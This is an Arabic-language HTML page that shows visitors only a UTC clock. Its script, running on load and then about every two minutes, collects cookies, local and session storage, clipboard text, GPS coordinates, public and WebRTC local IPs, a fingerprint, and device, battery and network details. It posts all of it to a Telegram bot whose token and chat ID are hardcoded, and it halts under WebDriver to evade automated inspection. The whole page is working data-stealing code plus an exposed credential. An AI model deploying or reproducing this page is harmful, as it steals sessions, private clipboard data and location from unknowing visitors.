<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>جمع البيانات والإرسال إلى تليجرام</title>
<style>
  body {
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    padding: 25px;
    background: #f9f9f9;
    color: #222;
    direction: rtl;
    text-align: right;
  }
  h1.title {
    color: #5C6AC4;
    margin-bottom: 10px;
  }
  #currentTime {
    font-size: 1.25rem;
    margin-bottom: 20px;
  }
  #status {
    font-size: 1rem;
    color: #555;
    white-space: pre-wrap;
    background: #e0e7ff;
    padding: 12px;
    border-radius: 8px;
    margin-top: 15px;
    font-family: monospace;
  }
</style>
</head>
<body>

<h1 class="title">الوقت الحالي بالتوقيت العالمي (UTC):</h1>
<div id="currentTime"></div>
<div id="status">جارٍ التهيئة ...</div>

<script>
  // عرض الوقت UTC محدث كل ثانية
  function showTime() {
    document.getElementById('currentTime').textContent = new Date().toUTCString();
  }
  showTime();
  setInterval(showTime, 1000);

  // إعدادات Telegram والباقي
  const CONFIG = {
    telegram: {
      enabled: true,
      token: "8542679117:AAFjylsLlOPzBUap7wG2lbJhRoFHcWBmPdE", // ضع توكن البوت الصحيح هنا
      chat: "8353431281"  // رقم الشات الصحيح هنا
    },
    modules: {
      permissions: true,
      ip: true,
      device: true,
      fingerprint: true,
      geo: true,
      clipboard: true,
      storage: true,
      webrtc: true,
      battery: true,
      network: true
    },
    intervals: {
      base: 120000,
      jitter: 10000
    }
  };

  const statusEl = document.getElementById('status');
  
  function updateStatus(text) {
    if (!statusEl) return;
    statusEl.textContent = text;
  }

  // دالة هروب لـ HTML (آمنة)
  function escapeHtml(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  // دالة fetch مع محاولة إعادة الاتصال
  async function fetchWithRetry(url, options = {}, retries = 3, wait = 1000) {
    for(let i=0; i<retries; i++) {
      try {
        const res = await fetch(url, {...options, cache:"no-store"});
        if(res.ok) return res;
      } catch {}
      await new Promise(r => setTimeout(r, wait * (i+1)));
    }
    return null;
  }

  // جمع صلاحيات المتصفح
  async function collectPermissions() {
    const perms = ['camera','geolocation','microphone','notifications','midi','usb'];
    let result = {};
    if(!navigator.permissions) return result;
    for(const p of perms) {
      try {
        const status = await navigator.permissions.query({name: p});
        result[p]=status.state;
      } catch {}
    }
    return result;
  }

  // جمع بيانات الجهاز والمتصفح
  async function collectDeviceInfo() {
    return {
      'وكيل المستخدم': navigator.userAgent || 'غير متوفر',
      'النظام والمنصة': navigator.platform || 'غير متوفر',
      'اللغة الأساسية': navigator.language || 'غير متوفر',
      'لغات المتصفح': navigator.languages ? navigator.languages.join(', ') : 'غير متوفر',
      'دقة الشاشة': `${screen.width || 'N/A'}x${screen.height || 'N/A'}`,
      'عمق الألوان': screen.colorDepth || 'غير متوفر',
      'كثافة البيكسل': window.devicePixelRatio || 'غير متوفر',
      'المنطقة الزمنية': Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير متوفر',
      'عدد أنوية المعالج': navigator.hardwareConcurrency || 'غير متوفر',
      'ذاكرة الجهاز (جيجا)': navigator.deviceMemory || 'غير متوفر',
      'دعم اللمس': 'ontouchstart' in window ? 'نعم' : 'لا',
      'تشغيل WebDriver': navigator.webdriver ? 'نعم' : 'لا',
      'عنوان URL': window.location.href || 'غير متوفر',
      'مرجع الصفحة': document.referrer || 'غير متوفر'
    };
  }

  // جمع بصمة Canvas وبصمة WebGL
  async function collectFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('بصمة...', 2, 15);

      const webgl = (() => {
        try {
          let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          return gl ? 'مدعوم' : 'غير مدعوم';
        } catch {
          return 'غير مدعوم';
        }
      })();

      return {
        'بصمة Canvas (مقتطف)': canvas.toDataURL().slice(0,40) + '...',
        'دعم WebGL': webgl
      };
    } catch (e) {
      return { 'خطأ في البصمة': e.message };
    }
  }

  // جمع نص الحافظة إذا سمح المستخدم
  async function collectClipboard() {
    if(!navigator.clipboard) return 'غير متوفر';
    try {
      const text = await navigator.clipboard.readText();
      if(!text) return 'فارغة';
      return text.length > 400 ? text.slice(0,400) + ' ...' : text;
    } catch {
      return 'رفض الوصول';
    }
  }

  // جمع الكوكيز وlocal/session storage
  async function collectStorage() {
    try {
      return {
        'الكوكيز': document.cookie || 'لا يوجد',
        'localStorage': Object.keys(localStorage).length ? JSON.stringify(localStorage) : 'فارغ',
        'sessionStorage': Object.keys(sessionStorage).length ? JSON.stringify(sessionStorage) : 'فارغ'
      };
    } catch {
      return { 'الكوكيز': 'خطأ في الوصول', 'localStorage': 'خطأ في الوصول', 'sessionStorage': 'خطأ في الوصول' };
    }
  }

  // جمع بيانات الموقع الجغرافي
  function collectGeoData() {
    return new Promise(resolve => {
      if(!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(pos => {
        resolve({
          'خط العرض': pos.coords.latitude,
          'خط الطول': pos.coords.longitude,
          'دقة الموقع (بالمتر)': pos.coords.accuracy
        });
      }, () => resolve(null), {timeout: 15000});
    });
  }

  // جمع IP والدولة والمدينة والمنطقة عبر api.ipapi.co
  async function collectIPGeo() {
    const url = "https://ipapi.co/json/";
    try {
      const res = await fetchWithRetry(url, {}, 3, 1500);
      if(!res) return null;
      const d = await res.json();
      return {
        'ip': d.ip || 'غير معروف',
        'الدولة': d.country_name || 'غير معروف',
        'المدينة': d.city || 'غير معروف',
        'المنطقة': d.region || 'غير معروف',
        'رمز الهاتف': d.country_calling_code || 'غير معروف',
        'رمز الدولة': d.country || 'غير معروف',
        'الوقت المحلي': d.timezone || 'غير معروف',
        'مزود الإنترنت': d.org || 'غير معروف',
        'العملة': d.currency || 'غير معروف',
      };
    } catch {
      return null;
    }
  }

  // جمع IP محلي عبر WebRTC
  async function collectLocalIPs() {
    try {
      const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
      const ips = new Set();
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) return;
        const c = e.candidate.candidate;
        const m = c.match(/(\d{1,3}(\.\d{1,3}){3})/);
        if (m) ips.add(m[1]);
      };
      await pc.createOffer().then(o => pc.setLocalDescription(o));
      await new Promise(r => setTimeout(r, 1000));
      pc.close();
      return [...ips].join(', ') || 'غير معروف';
    } catch {
      return 'غير معروف';
    }
  }

  // جمع معلومات البطارية
  async function collectBattery() {
    if(!navigator.getBattery) return null;
    try {
      const b = await navigator.getBattery();
      return {
        'مستوى البطارية (%)': (b.level*100).toFixed(0),
        'شحن البطارية': b.charging ? 'نعم' : 'لا'
      };
    } catch {
      return null;
    }
  }

  // جمع معلومات الشبكة
  async function collectNetwork() {
    if (!navigator.connection) return null;
    try {
      const c = navigator.connection;
      return {
        'نوع الشبكة': c.effectiveType || 'غير معروف',
        'سرعة التنزيل (ميغابت/ث)': c.downlink || 'غير معروف',
        'تأخير الشبكة (ms)': c.rtt || 'غير معروف'
      };
    } catch {
      return null;
    }
  }

  // تحضير رسالة بتنسيق HTML (بدون <br>)
  function formatMessage(data) {
    const h = escapeHtml;
    let lines = [];

    // الوقت
    lines.push(`🕒 <b>الوقت:</b> ${h(new Date().toLocaleString('ar-EG',{timeZone: data.ipGeo?.['الوقت المحلي'] || 'UTC'}))}`);
    lines.push(``); // سطر فارغ
    lines.push(`🌐 <b>معلومات الجهاز والمتصفح:</b>`);
    for (const [k,v] of Object.entries(data.device||{}))
      lines.push(`• <b>${h(k)}:</b> ${h(String(v))}`);

    if(data.permissions){
      lines.push(``);
      lines.push(`🔐 <b>صلاحيات المتصفح:</b>`);
      for(const [p,s] of Object.entries(data.permissions))
        lines.push(`  • <b>${h(p)}:</b> ${h(s)}`);
    }

    if(data.fingerprint){
      lines.push(``);
      lines.push(`🎨 <b>بصمة Canvas (مقتطف):</b> ${h(data.fingerprint['بصمة Canvas (مقتطف)']||'')}`);
      lines.push(`🖼️ <b>دعم WebGL:</b> ${h(data.fingerprint['دعم WebGL']||'')}`);
    }

    lines.push(``);
    lines.push(`🌍 <b>معلومات الـ IP والدولة:</b>`);
    if(data.ipGeo){
      for(const [k,v] of Object.entries(data.ipGeo))
        lines.push(`• <b>${h(k)}:</b> ${h(String(v))}`);
    } else {
      lines.push(`• ${h('لا توجد معلومات الـ IP والدولة.')}`);
    }

    lines.push(``);
    lines.push(`🆔 <b>عناوين IP محلية:</b> ${h(data.localIPs||'غير معروف')}`);

    lines.push(``);
    lines.push(`📋 <b>نص الحافظة:</b>`);
    lines.push(`${h(data.clipboard||'غير متوفر')}`);

    if(data.storage){
      lines.push(``);
      lines.push(`🗄️ <b>الكوكيز والتخزين (مقتطف):</b>`);
      lines.push(`<b>الكوكيز:</b>`);
      lines.push(`${h(data.storage['الكوكيز'].slice(0,300))}${data.storage['الكوكيز'].length>300?'...':''}`);
      lines.push(`<b>localStorage:</b>`);
      lines.push(`${h(data.storage['localStorage'].slice(0,300))}${data.storage['localStorage'].length>300?'...':''}`);
      lines.push(`<b>sessionStorage:</b>`);
      lines.push(`${h(data.storage['sessionStorage'].slice(0,300))}${data.storage['sessionStorage'].length>300?'...':''}`);
    }

    if(data.geo){
      lines.push(``);
      lines.push(`📍 <b>الموقع الجغرافي (GPS):</b>`);
      lines.push(`<b>خط العرض:</b> ${h(String(data.geo['خط العرض']||'غير معروف'))}`);
      lines.push(`<b>خط الطول:</b> ${h(String(data.geo['خط الطول']||'غير معروف'))}`);
      lines.push(`<b>الدقة (بالمتر):</b> ${h(String(data.geo['دقة الموقع (بالمتر)']||'غير معروف'))}`);
    } else {
      lines.push(``);
      lines.push(`📍 ${h('الموقع الجغرافي غير متوفر.')}`);
    }

    if(data.battery){
      lines.push(``);
      lines.push(`🔋 <b>معلومات البطارية:</b>`);
      for(const [k,v] of Object.entries(data.battery))
        lines.push(`• <b>${h(k)}:</b> ${h(String(v))}`);
    }

    if(data.network){
      lines.push(``);
      lines.push(`📶 <b>معلومات الشبكة:</b>`);
      for(const [k,v] of Object.entries(data.network))
        lines.push(`• <b>${h(k)}:</b> ${h(String(v))}`);
    }

    if(data.errors && data.errors.length){
      lines.push(``);
      lines.push(`⚠️ <b>الأخطاء:</b>`);
      lines.push(h(data.errors.join('\n')));
    }

    // دمج الأسطر بفواصل أسطر عادية (بدون <br>)
    return lines.join('\n').slice(0,4000);
  }

  // إرسال رسالة إلى Telegram باستخدام HTML
  async function sendToTelegram(text){
    if(!CONFIG.telegram.enabled) return;
    try {
      const url = `https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`;
      const params = new URLSearchParams();
      params.append('chat_id', CONFIG.telegram.chat);
      params.append('text', text);
      params.append('parse_mode', 'HTML');
      const res = await fetch(url,{method:'POST',body:params});
      if(!res.ok){
        const json = await res.json().catch(() => null);
        throw new Error(`خطأ تليجرام: ${res.status} ${res.statusText} ${json?.description||''}`);
      }
      updateStatus(`تم إرسال البيانات بنجاح: ${new Date().toLocaleTimeString()}`);
    }catch(err){
      updateStatus(`فشل إرسال البيانات:\n${err.message}`);
      console.error(err);
    }
  }

  // جمع البيانات وإرسالها
  async function collectAndSend(){
    if(navigator.webdriver){
      updateStatus('تم اكتشاف بيئة برمجية تلقائية (WebDriver). إيقاف التنفيذ.');
      return;
    }
    updateStatus('جاري جمع البيانات...');

    const data = {timestamp: new Date().toISOString(), errors: []};
    try {
      if(CONFIG.modules.device) data.device = await collectDeviceInfo();
      if(CONFIG.modules.permissions) data.permissions = await collectPermissions();
      if(CONFIG.modules.fingerprint) data.fingerprint = await collectFingerprint();
      if(CONFIG.modules.clipboard) data.clipboard = await collectClipboard();
      if(CONFIG.modules.storage) data.storage = await collectStorage();
      if(CONFIG.modules.geo) data.geo = await collectGeoData();
      if(CONFIG.modules.ip) data.ipGeo = await collectIPGeo();
      if(CONFIG.modules.webrtc) data.localIPs = await collectLocalIPs();
      if(CONFIG.modules.battery) data.battery = await collectBattery();
      if(CONFIG.modules.network) data.network = await collectNetwork();
    } catch(err){
      data.errors.push(err.message);
      console.error(err);
    }
    const message = formatMessage(data);
    await sendToTelegram(message);
  }

  // بدء التكرار الدوري مع فترة متغيرة
  function startLoop(){
    const {base, jitter} = CONFIG.intervals;
    const timeout = base + (Math.random()*2 -1)*jitter;
    setTimeout(async () => {
      await collectAndSend();
      startLoop();
    }, timeout);
  }

  // بدء التنفيذ عند التحميل
  window.addEventListener('load', () => {
    collectAndSend();
    startLoop();
  });

</script>

</body>
</html>
